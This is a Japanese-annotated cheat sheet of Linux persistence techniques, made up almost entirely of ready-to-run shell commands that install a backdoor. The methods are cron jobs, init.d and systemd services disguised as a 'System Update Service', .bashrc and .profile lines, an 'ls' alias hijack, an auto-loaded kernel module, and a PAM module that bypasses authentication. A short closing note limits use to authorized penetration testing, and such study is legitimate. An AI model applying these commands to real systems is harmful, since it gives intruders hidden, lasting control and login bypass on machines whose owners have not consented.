# Linux Persistence Techniques

## Cron ジョブ

### システムワイドCron
```bash
# システムワイドなCronジョブの追加
echo "* * * * * /path/to/backdoor" > /etc/cron.d/systemupdate
echo "* * * * * root /path/to/backdoor" >> /etc/crontab

# 定期実行ディレクトリの利用
cp /path/to/backdoor /etc/cron.hourly/
chmod +x /etc/cron.hourly/backdoor
```

### ユーザーCron
```bash
# ユーザーのCronジョブに追加
(crontab -l 2>/dev/null; echo "* * * * * /path/to/backdoor") | crontab -

# Cron ジョブの確認
crontab -l
```

## 起動スクリプト

### システム起動スクリプト
```bash
# init.d スクリプトの作成
cat << EOF > /etc/init.d/systemupdate
#!/bin/sh
### BEGIN INIT INFO
# Provides:          systemupdate
# Required-Start:    $network $syslog
# Required-Stop:     $network $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Description:       System Update Service
### END INIT INFO

case "\$1" in
    start)
        /path/to/backdoor &
        ;;
esac
exit 0
EOF

chmod 755 /etc/init.d/systemupdate
update-rc.d systemupdate defaults
```

### Systemd サービス
```bash
# Systemd サービスの作成
cat << EOF > /etc/systemd/system/systemupdate.service
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/path/to/backdoor
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable systemupdate
systemctl start systemupdate
```

## シェル設定ファイル

### ユーザーシェル設定
```bash
# .bashrc への追加
echo "nohup /path/to/backdoor &" >> ~/.bashrc

# .profile への追加
echo "nohup /path/to/backdoor &" >> ~/.profile

# .bash_aliases への追加
echo "alias ls='nohup /path/to/backdoor & ls'" >> ~/.bash_aliases
```

## カーネルモジュール

### カーネルモジュールの永続化
```bash
# カーネルモジュールのビルド
make
cp backdoor.ko /lib/modules/$(uname -r)/kernel/drivers/

# モジュールの自動ロード設定
echo "backdoor" >> /etc/modules
depmod -a
```

## PAM モジュール

### PAM 認証バックドア
```bash
# PAM モジュールのコンパイル
gcc -fPIC -shared -o backdoor.so backdoor.c
cp backdoor.so /lib/security/

# PAM 設定の変更
echo "auth sufficient backdoor.so" >> /etc/pam.d/common-auth
```

## 注意事項
- これらの技術は、許可された環境でのペネトレーションテストでのみ使用してください
- システムの重要な機能に影響を与える可能性があります
- 実環境での使用は違法となる可能性があります 